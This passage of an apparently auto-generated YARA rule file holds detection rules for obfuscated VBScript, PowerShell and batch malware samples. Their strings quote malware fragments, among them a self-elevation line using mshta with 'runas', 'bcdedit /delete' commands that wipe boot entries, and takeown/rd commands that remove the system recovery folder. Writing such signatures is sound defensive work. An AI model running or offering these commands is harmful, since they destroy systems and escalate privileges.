      $s18 = "AF9faW1wX19fcF9fX2FyZ2MAX19pbXBfdHpuYW1lAF9pbml0aWFsaXplX29uZXhpdF90YWJsZQBfX190bHNfc3RhcnRfXwAucmVmcHRyLl9fbmF0aXZlX3N0YXJ0dXBf" ascii /* base64 encoded string ' __imp___p___argc __imp_tzname _initialize_onexit_table ___tls_start__ .refptr.__native_startup_state __imp_tzset GetLastError __imp__initialize_wide_environment __rt_psrelocs_start __dll_characteristics__ __size_of_stack_commit__ __lib64_libapi_ms_win_crt_time_l1_1_0_a_iname __mingw_module_is_dll __size_of_stack_reserve__ __major_subsystem_version__ ___crt_xl_start__ __imp_DeleteCriticalSection .refptr.__CTOR_LIST__ VirtualQuery __imp___p___argv ___crt_xi_start__ __imp__amsg_exit ___crt_xi_end__ .refptr.__mingw_module_is_dll _tls_start .refptr.__RUNTIME_PSEUDO_RELOC_LIST__ TlsGetValue __bss_start__ ___RUNTIME_PSEUDO_RELOC_LIST_END__ __imp___tzname __size_of_heap_commit__ __imp___stdio_common_vfprintf __imp_GetLastError __imp__initial' */
      $s19 = "X18ALndlYWsuX19yZWdpc3Rlcl9mcmFtZV9pbmZvLmhtb2RfbGliZ2NjAF9fZGVyZWdpc3Rlcl9mcmFtZV9pbmZvAF9fZGF0YV9lbmRfXwBfX2ltcF9md3JpdGUAX19D" ascii /* base64 encoded string '__ .weak.__register_frame_info.hmod_libgcc __deregister_frame_info __data_end__ __imp_fwrite __CTOR_LIST__ __imp__set_new_mode _head_lib64_libapi_ms_win_crt_heap_l1_1_0_a __imp___getmainargs _head_lib64_libkernel32_a GetModuleHandleA __bss_end__ __native_vcclrit_reason ___crt_xc_end__ .refptr.__native_startup_lock __imp_EnterCriticalSection hmod_libgcc _tls_index __acrt_iob_func __native_startup_state ___crt_xc_start__ __imp_GetProcAddress ___CTOR_LIST__ .refptr.__dyn_tls_init_callback __imp__register_onexit_function _head_lib64_libapi_ms_win_crt_string_l1_1_0_a __imp_GetModuleHandleA __rt_psrelocs_size _execute_onexit_table __lib64_libapi_ms_win_crt_runtime_l1_1_0_a_iname __imp___p___wargv __imp_strlen __imp___wgetmainargs __imp___da' */
      $s20 = "eWxpZ2h0AF9fZmlsZV9hbGlnbm1lbnRfXwBfX2ltcF9Jbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAF9fcF9fd2Vudmlyb24AX2luaXRpYWxpemVfbmFycm93X2Vudmly" ascii /* base64 encoded string 'ylight __file_alignment__ __imp_InitializeCriticalSection __p__wenviron _initialize_narrow_environment _crt_at_quick_exit InitializeCriticalSection _head_lib64_libapi_ms_win_crt_stdio_l1_1_0_a __imp_vfprintf __major_os_version__ __IAT_start__ .weak.__deregister_frame_info.hmod_libgcc __imp___stdio_common_vfwprintf __imp__onexit GetProcAddress __DTOR_LIST__ __imp__initialize_onexit_table __imp_Sleep LeaveCriticalSection __size_of_heap_reserve__ ___crt_xt_start__ __subsystem__ __imp_TlsGetValue __imp___p__wenviron __imp__execute_onexit_table __imp___timezone __imp_fprintf _configure_wide_argv __imp__crt_atexit __lib64_libapi_ms_win_crt_environment_l1_1_0_a_iname __imp_FreeLibrary _register_onexit_function __p___argc __imp_VirtualProtect' */
   condition:
      uint16(0) == 0x2a2f and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule Script_20 {
   meta:
      description = "Script_20"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d42ce863d02bc970b632e8f6794d433fe059670f1bcd42aaec99bac868d6ebe1"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ' */
      $s6 = "AAAAAAAAAEE" ascii /* base64 encoded string '       A' */
      $s7 = "AEBAAAAAAA" ascii /* base64 encoded string ' @@    ' */
      $s8 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s9 = "EAAAAACBAAAA" ascii /* base64 encoded string '     @  ' */
      $s10 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s11 = "AAAAAEAAAEAAAA" ascii /* base64 encoded string '    @  @  ' */
      $s12 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s13 = "AAAAAAAAAABAA" ascii /* base64 encoded string '        @' */
      $s14 = "AAAAAAABAAAA" ascii /* base64 encoded string '     @  ' */
      $s15 = "DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                          ' */
      $s16 = "AAAAAAAAAABAAEA" ascii /* base64 encoded string '        @ @' */
      $s17 = "N/OkraFeSQjHPMQLatEepZ5h0Wq0DDf4AAAAAEg+CkbayFmZhNlLlxGcwFmLt92YR+OdRuPWeR3DMFv79PiJ+WKppkNJG42jy4XqL2rer6mB1uEQ0FSPyy1jO2h9h9wL" ascii
      $s18 = "AUWbh50X0V2ZAUGb1R2bNN3clN2byBFAlxWdk9WTulWYN9FdldGAlxWdk9WToBHbAUGb0lGV39GZul2VlZXa0NWYAUGb0lGV0NXYsBQZslmRoBQZslmRm90dllmVwFWb" ascii
      $s19 = "AUAIfBAAAAEIRCwAM4PAAwg/gNGAAAwAg8FAAAAIgEJADwg/AAAD+D2YAAAABAyXAAAAQASkAMAD+DAAM4PYiBAAAEAIfBAAAgAIRCwAM4PAAwg/gJGAAAwAg8FAAAAB" ascii
      $s20 = "J5UVfRFWFR1XTlEATVET1oGZXNFATVERAMFRzMFdPBwUDlEVTlEVBR1UfV0USVkVFJ1XFR0TDlkTV9FVYVEVfNVSAM1QJR1UJRVQUN1XFR0TDlkTV9FVYVEVfNVSAMlM" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule Script_21 {
   meta:
      description = "Script_21"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "857ae746a9d7ce6eb687f8b8a98192902a22311d50f957ca12b0744a2b37db18"
   strings:
      $s1 = "Private Const Pistilogy = \"Overreader mindretalsregering elevatorfreren:\"" fullword ascii
      $s2 = "Private Const Execs = &HAFE8" fullword ascii
      $s3 = "Private Const Cysticolous = \"Adresselse94 lidelse logicizes libytheidae:\"" fullword ascii
      $s4 = "Private Const Preprocessorens = \"Quarto weiselbergite! unbastinadoed\"" fullword ascii
      $s5 = "Private Const Skridttlleres105 = \"Kosmetologi matchings71. arveonklerne prayerfulness:\"" fullword ascii
      $s6 = "Private Const Pelicometer = \"Blokbebyggelserne: tamt:\"" fullword ascii
      $s7 = "Private Const Halogenlygterne = \"Headpin kindlessly; peeved!\"" fullword ascii
      $s8 = "Private Const Temporalness = \"Laralia makke bilbombes:\"" fullword ascii
      $s9 = "Private Const Wamefull4 = \"Dumpiest, hundepensionernes hovedstol navarho;\"" fullword ascii
      $s10 = "Private Const Prsidentvalget = -21091" fullword ascii
      $s11 = "Private Const Logoet = -6301" fullword ascii
      $s12 = "Private Const axiolog = -22568" fullword ascii
      $s13 = "Private Const Lederlaget = -34437" fullword ascii
      $s14 = "Private Const gastroenterologic = -27232" fullword ascii
      $s15 = "Private Const Logchip = -36826" fullword ascii
      $s16 = "Private Const Analogist = -34674" fullword ascii
      $s17 = "Private Const Teknologis = -50151" fullword ascii
      $s18 = "Private Const Underbygget = -49634" fullword ascii
      $s19 = "Private Const Eksportraad = \"Horizontalizations, regionplanlovenes folkeslagets skemalagte\"" fullword ascii
      $s20 = "Private Const Underarmsmusklernes = \"miljvenligst? shellycoat\"" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_22 {
   meta:
      description = "Script_22"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e5a75d4957728ff547abb3d7826de2292947602b560b53e9d225d94549833bad"
   strings:
      $x1 = "Set Bkkenbundsmuskulaturer = Antidemocracy.Exec(\"cmd.exe /c ping 6777.6777.6777.677e\")" fullword ascii
      $s2 = "Private Const Klkningsprocesser = &HFFFFF974" fullword ascii
      $s3 = "Private Const Punching = \"Ladronism? strafprocessers salerio\"" fullword ascii
      $s4 = "Private Const Processtyringers = \"Skriftrullen reconsigned ddskrampes?\"" fullword ascii
      $s5 = "Private Const Oproerer = \"Preinscribing forskriften bacterioprecipitin processtyringen\"" fullword ascii
      $s6 = "Private Const Oecologies = \"Cubicular polarklimas:\"" fullword ascii
      $s7 = "Private Const Sandsynlighedsberegninger = \"Optegnelsernes amatrerne ejectment fonologiskes:\"" fullword ascii
      $s8 = "Private Const Rugning = \"Angelicize; internationaliseringsprocesserne neurally\"" fullword ascii
      $s9 = "Private Const Xylograf = \"Tabitha stalddrssalgets\"" fullword ascii
      $s10 = "Private Const Buts = \"Estimspr nontemperate:\"" fullword ascii
      $s11 = "Rem Gabriello aabningstal postinjection18" fullword ascii
      $s12 = "Private Const Mk = \"Inkompetencernes; postterminalerne reservefondets microseismology.\"" fullword ascii
      $s13 = "Private Const Dumperne168 = \"Lillelund. impresses husmndenes bortflytnings\"" fullword ascii
      $s14 = "Private Const Saphead = -14909" fullword ascii
      $s15 = "Private Const Postekspeditioner = -55910" fullword ascii
      $s16 = "Private Const Ichnolithology = -57000" fullword ascii
      $s17 = "Private Const Udlgget = -11378" fullword ascii
      $s18 = "Private Const Opstrget109 = -40012" fullword ascii
      $s19 = "Private Const Circumarticular = -13262" fullword ascii
      $s20 = "Private Const Bidarka = -12686" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule Script_23 {
   meta:
      description = "Script_23"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d90f3ab705edef2a59cc39b6269f1a149f0f6e43e0aa4f128d05c1697726bcdb"
   strings:
      $x1 = "}$Distingverende80;}$Forkhead = (cmd /c 'echo 1 && exit');if (Test-Path 'reservats:\\Forfaldt\\Tiptipoldemoders') {$Forkhead--};" ascii
      $s2 = "Set Recompel = Registertrkket.ExecQuery(\"Select * from Win32_Service\")" fullword ascii
      $s3 = "}$Distingverende80;}$Forkhead = (cmd /c 'echo 1 && exit');if (Test-Path 'reservats:\\Forfaldt\\Tiptipoldemoders') {$Forkhead--};" ascii
      $s4 = "Call declaimers.ShellExecute(\"P\" & skallesmkkerens & \".exe\", Reflectioning, \"\", \"\", Tatovernaale)" fullword ascii
      $s5 = "Abdul = \"Forsvenskningers166 dumpernes:\"" fullword ascii
      $s6 = "Set Registertrkket = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")" fullword ascii
      $s7 = "Rem Jeltje sufflses apologias? injective" fullword ascii
      $s8 = "Rem Unsloping colipyuria nvnsprocessen" fullword ascii
      $s9 = "Varefordelingen = \"Unaccommodatingness tremoloso minerologists bombesikre:\"" fullword ascii
      $s10 = "Rem Empoisonment whomping snnesnnerne" fullword ascii
      $s11 = "Systematology = -8777" fullword ascii
      $s12 = "Spreadhead = -16648" fullword ascii
      $s13 = "S1 = S1 + \"<#Patchy Corporis Vergaloo #>;<#sndagsskolers Paws Alexandrite Calc32kit #>;New-Item -Path 'reservats:\\Forfaldt' -N" ascii
      $s14 = "S1 = S1 + \"<#Patchy Corporis Vergaloo #>;<#sndagsskolers Paws Alexandrite Calc32kit #>;New-Item -Path 'reservats:\\Forfaldt' -N" ascii
      $s15 = "Amtsvej = \"Rundkirker spiseskefuldenes aldringsprocessen\"" fullword ascii
      $s16 = "Rem autarkiet elsdyrhoveds tankeprocessens nstmest sortkunsts" fullword ascii
      $s17 = "processorsignalerne = 52685" fullword ascii
      $s18 = "Rem Uflsom klaekningsprocessen smoothable" fullword ascii
      $s19 = "Ungdommeligstes = \"Instigatrix? supplace forretningsbestyrerens. cheirology:\"" fullword ascii
      $s20 = "Rem Rge! mikroprocessorer digtergagers" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule Script_24 {
   meta:
      description = "Script_24"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "be9c4de1bd9e9d924a0e82ded834836b21f3cee35501e66166c1f3e267204baa"
   strings:
      $x1 = "H4sIAAAAAAAEAOy2Y5Sl3ZYuuMO2bdu2bdu2IzPsyLBt27YjMiMybNtWBm9836lzqm5VdXf96x6j73zHWvOdeuaz5tp77A0A/B/5/59wG35tsAASxP+3ifzfCL+XrbGd" ascii
      $s2 = "set \"Kxcxlucfky=/h /i %0 %temp%\"" fullword ascii
      $s3 = "sc/LoWY9w0fyx/JuctsGBs92pJQI8sTEMP+K1Y+a8pnloDDe2ZCCgZNqYy9iU/CB7bin+eXysVdpicRh38dheSKAewcm4ZgnlDId7iUJzQBU3L5q0Rdget9HYrOc1+Z1" ascii
      $s4 = "5LbpY0ngMgRXF2H/KkVtgO/hR2V9LGnLGUzT3E2TX9mLRZwpF9TT4DnlKLAENPywaKqxd5J5CdNqodLOGiNixu/5+JfLjrbCpRN3pEInmZCY5dIBMvzM+I+c8WJX/3as" ascii
      $s5 = "Ej2deDDU7k3CjzcZMD1fvhfpIPExNrHdOUd4vWduQ/X/atGETB6kVHkcNsMuSYdkiZbVG0HK6mRzTpTJ/SkMAFC4Xtju+ULc8w6kf//v0EWFikZnj+ROJ4vaRWY1qOzw" ascii
      $s6 = "RdrlgET7/7F/4ik2Nyn4lFQFk6xrspyY7uXrhroRCYDCG/CwzrpQd0aN5czc/veFzcCKBwfJTaUX+RQS/0CyEb4Zqod+G91sUNeCdy22VaeOvDV9ghKq1h1wENN2Si2N" ascii
      $s7 = "V2MKe88xEuA22dUmp+0Mpa75wfD1JeVvKj4Tupoq16Fxj6y3ykSe970ZCHQscrVRRq9Yoc4j82kvla+4+Mlrzz53JiTQTJmoav/nnwILLFYHK9v44IElHWj0YlEWqQb+" ascii
      $s8 = "PvXlVUd1xoZ7f8kAwPYQb8oAknHvR2ITlAh++/YRwaydmozQrQ8TleOHzdM+djt1JTVrsUYAHvZ66XnnI5uBfgeTWlq8HsJN9/kWrk3ZXeyE1+6e0f10b5MAEEDvv9c1" ascii
      $s9 = "A5Hppl1NTejBH8AWcmxLwIAOwu2Vf/y/uqgpgeBb1fBauTiRddkMcX3Tz0pZxX7Kdt90TEYEqfHO86k6QTxFTpyaFrTUo+vFym95ByoOMksyW5rvB9NAPVjQlD95FFKb" ascii
      $s10 = "kHuhy60tBtWas+GpB3KMA1X0VU/6wDpgx1ON1UTjFNCMy9xKe16Yohg5Gt4M34RrbzgqYy40XzD1vPVo9L5RrTpvMeZSaNpsyQAhfST1ehcyBiLFVh78tvmffmmDuMPq" ascii
      $s11 = "+8UrwtvJEIDuMpUHBACrHBDBLUnbMvn8ssqSmdXW21l5hw7iz8EFKgsVHuYofcZvumPyLNGdZwq/t0bG2tm5JU6vdGkT+fx7CYK+lXYPe3suSlr87y4RL+UCxuaKoTla" ascii
      $s12 = "FGSxX/MEU2R83Ld2faHWhY+1lvFCsfFhRGEtXSVxQznIv8odgXbWTTs1Zr4mR6DU8xbRdObsEYe9NrXNV4SIlQtOlQkVZLn7VNz+jE5SDzHW9zZ+06NNy8ingoYypkbl" ascii
      $s13 = "iBsWa8e/CpuGUy1Syyligurt1ylqC96JgxM5a/jVyvcAKVYBzOr217uNNiySwuDnmgobDUMFfX9nYRUxkEyewLogPjHktLkGS+IIgmc1mvndUzhCoDDpxyriF8UxgOmo" ascii
      $s14 = "W/3T1FVa0jiXp/7yysms13Peani84/Q3sYIB2oO6A+tdshKZaEyEVNauZpOrrWelKU9Wr11Rr1DG/59j1HysLRG5msT6O627hf0r7kbiRwmI6/VkoepaLRFLfgW2WmKY" ascii
      $s15 = "bQxNe34lk+bA9/QRZRMM0tfDhlCxIgZVpClkv3obYW31FZA+icomNQyIXHc94xeEMYD5AtLTJ1m/7VQl/k6pT+rD06lERiZ5cVOZdpLOgN6EBFQxaCuajiGkDW9y0Hgx" ascii
      $s16 = "RrtKH3u2v1vyLX3C9BVwq+J26BPOephbw0f1SWKL2gzPEmFedLl2QL8jLP+Iu9vSluMYfDgjcqgM1nTzApzqTrEpwqY+o8cVjU68IUiurSHXo+m6HdaaAL7mtMpJJQLH" ascii
      $s17 = "D3GaWexEC+HyXtMEQJPx4bNSPZYYjyZ//HGp6oxqWoaB8VzxMHDM5OldPAxqPN2VrjyOlOEbUEQAYv/qLtMABUD6v1Mkt2FhrQiKlaM/OSDuJ+rzPl5KMRymkY37NVH5" ascii
      $s18 = "eA9pq8yPt391BGtOhysArxcmXve2lM4mCH6C50CcubhWyKEYzu50DH5nASoD4xXQRp6bj8JpnCgUu2QAJGOtpcm6sT0Vzq1vuXUDFTpzkvta9j5y67+mu/u1p/OKKsW8" ascii
      $s19 = "vuDnTEI9Zh1d/RPzq4onDZRZD7T2oE7hDJISpYSK3QF5fwhR1jdJ/IcUNYtHsh9R4YPy8E+EvAItYJSouEt069jOkkdISs1ft2pDZqtDJVvbgsn4A+1wsroOtNyJXXHi" ascii
      $s20 = "vg4ATlCsdfkb4JE/bkc1kHufTPySePyiP+e/6NR+DKeYUcdnbVtFApJbrkR6Aj01iv/zhXfCs7yOfUZ4ubO761hQ/xgc/7qs1mUXkgF6x8stwBpNzoX8n2rqmnFmqbjd" ascii
   condition:
      uint16(0) == 0x6573 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule Script_25 {
   meta:
      description = "Script_25"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b54e294ffceecdd1b684d58842cfb31a7f5661e250ed0869cea9d6fbd45c03c8"
   strings:
      $x1 = "%1 mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c %~s0 ::\",\"\",\"runas\",1)(window.close)&&e" ascii
      $s2 = " >nul&takeown /f \"%systemdrive%\\recovery\" /a /r /d y" fullword ascii
      $s3 = " >nul&rd \"%systemdrive%\\recovery\" /s /q" fullword ascii
      $s4 = " >nul&bcdedit /delete {bootloadersettings} /f" fullword ascii
      $s5 = " >nul&icacls \"%systemdrive%\\recovery\" /grant Administrators:F /t" fullword ascii
      $s6 = ">nul&start /min \"\" infdefaultinstall %cd%\\uninstall.inf" fullword ascii
      $s7 = " 2>nul&title Windows Error Code:0x%random%%random%%random%" fullword ascii
      $s8 = ">nul&echo Signature=$Windows NT$ >>uninstall.inf" fullword ascii
      $s9 = ">nul&echo [Version] >uninstall.inf" fullword ascii
      $s10 = ">nul&cd /d \"%~dp0\\\"" fullword ascii
      $s11 = " >nul&bcdedit /delete {current} /f" fullword ascii
      $s12 = " >nul&bcdedit /delete {memdiag} /f" fullword ascii
      $s13 = " >nul&bcdedit /delete {globalsettings} /f" fullword ascii
      $s14 = " >nul&bcdedit /delete {bootmgr} /f" fullword ascii
      $s15 = " >nul&bcdedit /delete {ntldr} /f" fullword ascii
      $s16 = ">nul&echo HKCR, >>uninstall.inf" fullword ascii
      $s17 = ">nul&echo [defaultinstall] >>uninstall.inf" fullword ascii
      $s18 = ">nul&echo HKLM, >>uninstall.inf" fullword ascii
      $s19 = ">nul&echo HKU, >>uninstall.inf" fullword ascii
      $s20 = ">nul&echo HKCU, >>uninstall.inf" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule Script_26 {
   meta:
      description = "Script_26"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e03f365bff6dc4429c91f0ebd0bfdbf6eadaeb3c3cf4b3b30ecb8e9797f46c5e"
   strings:
      $s1 = "%%~f0\"  \"C:\\\\Users\\\\Public\\\\Lewxa.txt\" 9   >nul 2>nul &" fullword ascii
      $s2 = "ZTM5Yjg5ZmZlNDllOGNiMWU5YWU5ZTA3ZThhYjliMDAwMDAwMDAwMDAwMDAwMDAw" fullword ascii /* base64 encoded string 'e39b89ffe49e8cb1e9ae9e07e8ab9b000000000000000000' */
      $s3 = "ODhlODllOGFmOWZmOGJkMDhkNDU4Y2U4Yzg4N2Y5ZmY4YjQ1OGM1MDhiMDZlODg5" fullword ascii /* base64 encoded string '88e89e8af9ff8bd08d458ce8c887f9ff8b458c508b06e889' */
      $s4 = "NDc1MGU4ZDUyYmZmZmY4NGRiN2UwNzhiYzdlODllOGRmZWZmNWY1ZTViYzM4YmMw" fullword ascii /* base64 encoded string '4750e8d52bffff84db7e078bc7e89e8dfeff5f5e5bc38bc0' */
      $s5 = "ZmZmM2VhZmZmMmM5YmNmZmU0OWU4ZGZmZTQ5ZThjZmZlNDllOGNmZmU0OWU4Y2Zm" fullword ascii /* base64 encoded string 'fff3eafff2c9bcffe49e8dffe49e8cffe49e8cffe49e8cff' */
      $s6 = "N2I1MzIzM2Q4MDU2MjhjMDdlNTQyNjVkYjI3YTViMDBlNDllOGQwMGU0OWU4ZDAw" fullword ascii /* base64 encoded string '7b53233d805628c07e54265db27a5b00e49e8d00e49e8d00' */
      $s7 = "YmY1M2EwNWJiMGM1NjZlOGEwNGZhYjE0ZGIyMzlkNWJlNjJlYTVlODllOWZhMzQz" fullword ascii /* base64 encoded string 'bf53a05bb0c566e8a04fab14db239d5be62ea5e89e9fa343' */
      $s8 = "MjRjNTVhNWFlOGUwMjM1MzVhNWFlNjcwYmYzMDllNWI0MzkzOTE1OTVhZTZmMDIz" fullword ascii /* base64 encoded string '24c55a5ae8e023535a5ae670bf309e5b439391595ae6f023' */
      $s9 = "MWViMGU2NDdiMWIyZTZkODYzMTQ1YTVhNWE1YThkMWI1NzRkMDllOGQyNWFlNmQ4" fullword ascii /* base64 encoded string '1eb0e647b1b2e6d863145a5a5a5a8d1b574d09e8d25ae6d8' */
      $s10 = "MDllODRkMDBiMTJjYmEwZjAwMDAwMDhiYzNlOGEyZTdmZmZmYTIwYWU4NGQwMGIx" fullword ascii /* base64 encoded string '09e84d00b12cba0f0000008bc3e8a2e7ffffa20ae84d00b1' */
      $s11 = "NWZlNmI1NWZlNGIzNWZlNGFiNjNlNmIzNWZlNDllNjNlNDlkNWZlOGFjNWZlNDZm" fullword ascii /* base64 encoded string '5fe6b55fe4b35fe4ab63e6b35fe49e63e49d5fe8ac5fe46f' */
      $s12 = "NDQyNDA4OGI0NjQ0ODVjMDc0MDllOGU5YWNmZWZmODk0NDI0MDg4YmM2ZThlNjA2" fullword ascii /* base64 encoded string '4424088b464485c07409e8e9acfeff894424088bc6e8e606' */
      $s13 = "MDAwMDAwMDAwMDAwMDAwMGU4YWI5YjAwZTlhZTllMDdlNDllOGNiMWUzOWI4OWZm" fullword ascii /* base64 encoded string '0000000000000000e8ab9b00e9ae9e07e49e8cb1e39b89ff' */
      $s14 = "ZWFhZjlmMDBmMWM3YjkwMGUzOWM4YTAwZTZhNjk1MzFlNDllOGRjMmUzOWM4YWZk" fullword ascii /* base64 encoded string 'eaaf9f00f1c7b900e39c8a00e6a69531e49e8dc2e39c8afd' */
      $s15 = "NzVmZGZmNTBlOGUzN2NmZWZmOGQ0ZGY0NWFlODllN2VmZWZmZWIxOTZhMDA2YTAx" fullword ascii /* base64 encoded string '75fdff50e8e37cfeff8d4df45ae89e7efeffeb196a006a01' */
      $s16 = "ZTQ5ZThjZmZlNDllOGNmZmU0OWU4Y2ZmZTQ5ZThjZmZlNDllOGNmZmU0OWU4Y2Zm" fullword ascii /* base64 encoded string 'e49e8cffe49e8cffe49e8cffe49e8cffe49e8cffe49e8cff' */
      $s17 = "MDAwMDAwMDAwMDAwMDAwMGU2YTU5NDAwZTdhNzk2MDllNDllOGM5YWUzOWM4YWZh" fullword ascii /* base64 encoded string '0000000000000000e6a59400e7a79609e49e8c9ae39c8afa' */
      $s18 = "ZmNlODllZTJmZmZmNTg4YjQ4Zjg0OTdjMGVmMGZmNDhmODc1MDg4ZDQwZjhlOGI1" fullword ascii /* base64 encoded string 'fce89ee2ffff588b48f8497c0ef0ff48f875088d40f8e8b5' */
      $s19 = "ZTM5YzhhZmFlNDllOGM5YWU3YTc5NjA5ZTZhNTk0MDAwMDAwMDAwMDAwMDAwMDAw" fullword ascii /* base64 encoded string 'e39c8afae49e8c9ae7a79609e6a594000000000000000000' */
      $s20 = "ZWJlNTg5ZDllYmViOGI0NDI0MDhlOGExZmFmZmZmNWJjMjA0MDBjMzUzNTY1Nzg5" fullword ascii /* base64 encoded string 'ebe589d9ebeb8b442408e8a1faffff5bc20400c353565789' */
   condition:
      uint16(0) == 0x4f43 and filesize < 9000KB and
      8 of them
}

